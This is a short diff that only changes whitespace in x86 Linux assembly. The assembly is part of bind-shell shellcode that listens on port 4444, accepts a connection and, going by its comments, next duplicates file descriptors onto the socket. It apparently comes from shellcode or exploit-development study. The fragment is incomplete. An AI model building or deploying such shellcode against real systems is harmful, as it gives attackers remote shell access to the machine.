@@ -26,10 +26,10 @@ _start:
 ;
 	mov edi, eax
 	push edx 			; *sockaddr INADDR_ANY = 0
-	push word 0x5c11	; *sockaddr PORT = 4444
-	push word 2				; *sockaddr AF_INET = 2	
+	push word 0x5c11		; *sockaddr PORT = 4444
+	push word 2			; *sockaddr AF_INET = 2	
 	mov ebx, esp
-	push byte 16		; push addrlen onto the stack
+	push byte 16			; push addrlen onto the stack
 	push ebx			; push the pointer to the struct onto the stack
 	push edi			; push sockfd onto the stack
 	mul edx
@@ -65,7 +65,7 @@ _start:
 	mov al, 102			; socketcall()
 	xor ebx, ebx
 	mov bl, 5			; SYS_ACCEPT
-	mov ecx, esp		; stack pointer args
+	mov ecx, esp			; stack pointer args
 	int 0x80
 	
 ; [ Duplicate file descriptors and write to socketfd ]
